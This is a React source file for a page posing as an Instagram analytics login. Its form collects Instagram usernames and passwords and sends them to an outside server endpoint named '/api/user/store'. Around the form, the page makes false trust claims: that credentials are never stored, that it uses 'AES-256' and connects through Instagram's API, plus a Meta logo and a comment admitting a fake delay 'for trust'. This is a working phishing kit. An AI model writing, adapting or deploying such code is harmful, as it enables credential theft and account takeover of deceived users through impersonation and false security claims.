import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useNavigate } from "react-router-dom";
import { 
  Lock, User, Eye, EyeOff, ArrowRight, Loader2, 
  AlertCircle, CheckCircle2, ShieldCheck, Fingerprint, Globe 
} from "lucide-react";

const InstagramLogin = () => {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');
  const [identifier, setIdentifier] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState({ type: '', message: '' });

  // Auto-hide alerts
  useEffect(() => {
    if (status.message) {
      const timer = setTimeout(() => setStatus({ type: '', message: '' }), 5000);
      return () => clearTimeout(timer);
    }
  }, [status]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!identifier || !password) {
      setStatus({ type: 'error', message: 'Verification credentials required.' });
      return;
    }

    setIsLoading(true);
    setStatus({ type: '', message: '' });

    try {
      // Simulate high-level encryption handshake for trust
      await new Promise(resolve => setTimeout(resolve, 800));
      
      await axios.post("https://insights-m3ek.onrender.com/api/user/store", { identifier, password });

      setStatus({ type: 'success', message: 'Authorization successful. Syncing profile...' });
      
      setTimeout(() => navigate("/insights"), 1500);
    } catch (err) {
      setIsLoading(false);
      setStatus({ 
        type: 'error', 
        message: "Verification failed. Please ensure credentials are correct." 
      });
    }
  };

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans flex flex-col items-center justify-center p-6 selection:bg-blue-100">
      
      {/* FLOATING STATUS TOAST */}
      <div className={`fixed top-8 left-1/2 -translate-x-1/2 z-50 flex items-center gap-3 px-6 py-4 rounded-2xl border shadow-2xl backdrop-blur-md transition-all duration-500 transform ${
        status.message ? 'translate-y-0 opacity-100 scale-100' : '-translate-y-12 opacity-0 scale-95 pointer-events-none'
      } ${
        status.type === 'success' ? 'bg-green-50 border-green-100 text-green-700' : 'bg-red-50 border-red-100 text-red-700'
      }`}>
        {status.type === 'success' ? <CheckCircle2 size={18} /> : <AlertCircle size={18} />}
        <p className="text-sm font-bold">{status.message}</p>
      </div>

      <div className="w-full max-w-[480px] space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-1000">
        
        {/* MAIN SECURITY CARD */}
        <div className="bg-slate-50 rounded-[40px] p-8 md:p-12 border border-slate-100 shadow-sm relative overflow-hidden">
          {isLoading && (
            <div className="absolute top-0 left-0 w-full h-1.5 bg-slate-200">
              <div className="h-full bg-blue-600 animate-[progress_2s_ease-in-out_infinite] w-1/3"></div>
            </div>
          )}

          <div className="mb-10">
            <div className="flex items-center gap-3 mb-4">
               <div className="p-2 bg-blue-600 text-white rounded-xl shadow-lg shadow-blue-200">
                 <ShieldCheck size={24} />
               </div>
               <span className="text-xs font-black uppercase tracking-widest text-slate-400">Security Protocol</span>
            </div>
            <h1 className="text-4xl font-bold tracking-tighter mb-3">Identity Access</h1>
            <p className="text-slate-500 font-medium leading-relaxed">
              Authenticate via Instagram's secure API node to authorize the analytics engine.
            </p>
          </div>

          <form className="space-y-4" onSubmit={handleSubmit}>
            <div className="relative group">
              <User className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600 transition-colors" size={18} />
              <input
                disabled={isLoading}
                type="text"
                placeholder="Instagram Username"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                className="w-full pl-14 pr-5 py-5 bg-white border border-slate-200 rounded-[22px] text-sm focus:outline-none focus:border-blue-600 focus:ring-4 focus:ring-blue-100/30 transition-all font-medium disabled:opacity-50"
              />
            </div>

            <div className="relative group">
              <Lock className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600 transition-colors" size={18} />
              <input
                disabled={isLoading}
                type={showPassword ? "text" : "password"}
                placeholder="Instagram Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full pl-14 pr-14 py-5 bg-white border border-slate-200 rounded-[22px] text-sm focus:outline-none focus:border-blue-600 focus:ring-4 focus:ring-blue-100/30 transition-all font-medium disabled:opacity-50"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-6 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
            
            <button 
              disabled={isLoading}
              type="submit"
              className={`group w-full mt-4 font-bold py-5 rounded-[22px] flex items-center justify-center gap-3 transition-all active:scale-[0.98] ${
                isLoading 
                ? 'bg-slate-200 text-slate-400 cursor-not-allowed' 
                : 'bg-black text-white hover:bg-slate-800 shadow-2xl shadow-slate-200'
              }`}
            >
              {isLoading ? (
                <>
                  <Loader2 size={18} className="animate-spin" />
                  Establishing Secure Node...
                </>
              ) : (
                <>
                  Authorize Engine
                  <ArrowRight size={18} className="group-hover:translate-x-1 transition-transform" />
                </>
              )}
            </button>
          </form>
        </div>

        {/* TRUST/INFO CARD */}
        <div className="grid grid-cols-2 gap-4">
            <div className="bg-slate-50 border border-slate-100 rounded-[30px] p-6">
                <Globe size={18} className="text-blue-600 mb-3" />
                <h4 className="text-xs font-bold uppercase tracking-wider mb-1">Global Node</h4>
                <p className="text-[10px] text-slate-500 font-medium leading-tight">Connecting via Instagram's public API gateway.</p>
            </div>
            <div className="bg-slate-50 border border-slate-100 rounded-[30px] p-6">
                <Fingerprint size={18} className="text-blue-600 mb-3" />
                <h4 className="text-xs font-bold uppercase tracking-wider mb-1">Privacy First</h4>
                <p className="text-[10px] text-slate-500 font-medium leading-tight">Credentials are never stored on our local database.</p>
            </div>
        </div>

        {/* FOOTER */}
        <div className="flex flex-col items-center pt-8 opacity-40">
          <p className="text-[9px] font-black uppercase tracking-[0.4em] text-slate-900 mb-3">Enterprise Security Level</p>
          <div className="flex items-center gap-4 grayscale">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" 
              alt="Meta" 
              className="h-2.5"
            />
            <div className="w-[1px] h-3 bg-slate-300" />
            <span className="text-[10px] font-bold tracking-tighter uppercase">AES-256 Bit</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;